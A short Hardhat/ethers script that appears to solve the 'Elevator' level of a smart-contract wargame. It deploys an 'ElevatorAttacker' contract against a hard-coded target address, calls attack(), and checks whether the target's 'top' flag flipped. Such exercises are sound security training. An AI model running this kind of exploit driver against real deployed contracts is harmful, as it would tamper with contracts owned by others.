import { ethers } from "hardhat";
import { deployContract } from "../../utils/deployContract";
import { abi } from "../../artifacts/contracts/11.Elevator/Elevator.sol/Elevator.json";
import { BigNumber, Contract } from "ethers";
import { displayEthBalance } from "../../utils/getEthBalance";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";

function setTargetContract() {
  const contractAddress = "0xBEdd2Bca152E2c7E55645CD7d585cd313FacbDF2";
  return new Contract(contractAddress, abi);
}

async function checkSucces(attacker: SignerWithAddress, target: Contract) {
  const top = await target.connect(attacker).top();
  console.log("Success: ", top);
}

async function main() {
  const target = setTargetContract();
  const [attacker] = await ethers.getSigners();

  const ContactFactory = await ethers.getContractFactory("ElevatorAttacker");
  const elevatorAttacker = await ContactFactory.deploy(target.address);
  await elevatorAttacker.deployed();

  const tx = await elevatorAttacker
    .connect(attacker)
    .attack({ gasLimit: "3000000" });
  await tx.wait();
  checkSucces(attacker, target);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
